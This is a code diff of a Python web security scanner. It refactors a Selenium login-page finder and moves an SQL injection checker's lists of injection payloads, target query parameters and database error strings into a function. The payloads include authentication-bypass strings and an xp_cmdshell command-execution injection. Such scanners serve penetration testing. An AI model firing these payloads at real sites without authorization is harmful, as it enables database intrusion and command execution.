@@ -2,7 +2,6 @@ from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.firefox.service import Service as FirefoxService
 from selenium.webdriver.common.by import By
-from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from time import sleep
@@ -27,7 +26,7 @@ def check_session_management(domain):
     os_type = platform.system()
     if os_type == "Windows":
         geckodriver_path = os.path.join(os.path.dirname(__file__), 'geckodriver.exe')
-    elif os_type == "Linux" or os_type == "Darwin":  
+    elif os_type == "Linux" or os_type == "Darwin":
         geckodriver_path = os.path.join(os.path.dirname(__file__), 'geckodriver')
     else:
         raise Exception(f"Unsupported OS: {os_type}")
@@ -38,20 +37,13 @@ def check_session_management(domain):
 
     driver = webdriver.Firefox(service=service, options=options)
     try:
-        driver.get(domain)
-        wait = WebDriverWait(driver, 10)
-
-    login_paths = [
-        "login",
-        "wp-login.php",
-        "admin",
-        "user/login",
-        "signin"
-    ]
-
-    try:
-        driver = webdriver.Firefox(service=service, options=options)
-        wait = WebDriverWait(driver, 10)
+        login_paths = [
+            "login",
+            "wp-login.php",
+            "admin",
+            "user/login",
+            "signin"
+        ]
 
         login_pages = []
         for path in login_paths:
@@ -71,49 +63,48 @@ def check_session_management(domain):
         driver.quit()
 
 
-
-# Set up logging
-logging.basicConfig(filename='sql_injection_scan.log', level=logging.INFO, 
-                    format='%(asctime)s - %(levelname)s - %(message)s')
-
-# List of SQL injection payloads
-injection_payloads = [
-    "' OR '1'='1",
-    "' OR '1'='1' --",
-    "' OR '1'='1' ({",
-    "' OR '1'='1' /*",
-    "' OR '1'='1' #",
-    "'; EXEC xp_cmdshell('ping 127.0.0.1') --",
-    "admin'--",
-    "admin'/*",
-    "' OR 1=1 --",
-    "' OR 1=1 #",
-    "' OR 1=1/*",
-    "admin' or '1'='1"
-]
-
-# List of common query parameters
-query_params = [
-    "id", "name", "search", "q", "query", "item", "category", "product",
-    "page", "user", "username", "email", "login", "pass", "password",
-    "type", "sort", "order", "filter", "view", "action", "cmd", "command",
-    "module", "path", "file", "filename", "dir", "directory", "folder",
-    "content", "data", "date", "time", "year", "month", "day", "event",
-    "title", "description", "comment", "message", "post", "article",
-    "news", "blog", "forum", "thread", "topic", "board", "section",
-    "chapter", "pageid", "postid", "threadid", "articleid", "newsid",
-    "blogid", "forumid", "topicid", "boardid", "sectionid", "chapterid"
-]
-
-# List of common SQL error indicators
-sql_error_indicators = [
-    "sql syntax", "mysql", "syntax error", "sql error", "database error", 
-    "invalid query", "unclosed quotation mark", "quoted string not properly terminated",
-    "warning: pg_query", "unterminated quoted string", "error executing query",
-    "you have an error in your sql syntax", "unexpected token", "missing right parenthesis"
-]
-
 def check_sql_injection(domain, delay=1, proxy=None, user_agents=None):
+    # Set up logging
+    logging.basicConfig(filename='sql_injection_scan.log', level=logging.INFO, 
+                        format='%(asctime)s - %(levelname)s - %(message)s')
+
+    # List of SQL injection payloads
+    injection_payloads = [
+        "' OR '1'='1",
+        "' OR '1'='1' --",
+        "' OR '1'='1' ({",
+        "' OR '1'='1' /*",
+        "' OR '1'='1' #",
+        "'; EXEC xp_cmdshell('ping 127.0.0.1') --",
+        "admin'--",
+        "admin'/*",
+        "' OR 1=1 --",
+        "' OR 1=1 #",
+        "' OR 1=1/*",
+        "admin' or '1'='1"
+    ]
+
+    # List of common query parameters
+    query_params = [
+        "id", "name", "search", "q", "query", "item", "category", "product",
+        "page", "user", "username", "email", "login", "pass", "password",
+        "type", "sort", "order", "filter", "view", "action", "cmd", "command",
+        "module", "path", "file", "filename", "dir", "directory", "folder",
+        "content", "data", "date", "time", "year", "month", "day", "event",
+        "title", "description", "comment", "message", "post", "article",
+        "news", "blog", "forum", "thread", "topic", "board", "section",
+        "chapter", "pageid", "postid", "threadid", "articleid", "newsid",
+        "blogid", "forumid", "topicid", "boardid", "sectionid", "chapterid"
+    ]
+
+    # List of common SQL error indicators
+    sql_error_indicators = [
+        "sql syntax", "mysql", "syntax error", "sql error", "database error", 
+        "invalid query", "unclosed quotation mark", "quoted string not properly terminated",
+        "warning: pg_query", "unterminated quoted string", "error executing query",
+        "you have an error in your sql syntax", "unexpected token", "missing right parenthesis"
+    ]
+
     vulnerable = False
     headers = {'User-Agent': 'Mozilla/5.0'}  # Default User-Agent
 
